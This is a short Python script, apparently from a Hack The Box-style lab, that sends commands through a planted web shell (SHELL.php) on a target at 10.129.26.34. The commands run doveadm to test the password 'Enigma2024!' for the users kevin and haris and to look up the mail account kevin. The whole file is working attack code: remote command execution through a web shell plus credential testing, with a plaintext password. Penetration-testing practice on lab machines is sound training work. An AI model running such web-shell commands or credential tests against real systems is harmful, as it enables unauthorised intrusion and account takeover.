import urllib.request, urllib.parse

url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "export PATH=/usr/bin:/usr/sbin; echo '=== auth test ==='; /usr/bin/doveadm auth test kevin Enigma2024! 2>&1; echo '=== auth test haris ==='; /usr/bin/doveadm auth test haris Enigma2024! 2>&1; echo '=== auth lookup ==='; /usr/bin/doveadm user kevin 2>&1; echo DONE"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=15)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:2000])
except Exception as e:
    print(f"Error: {e}")
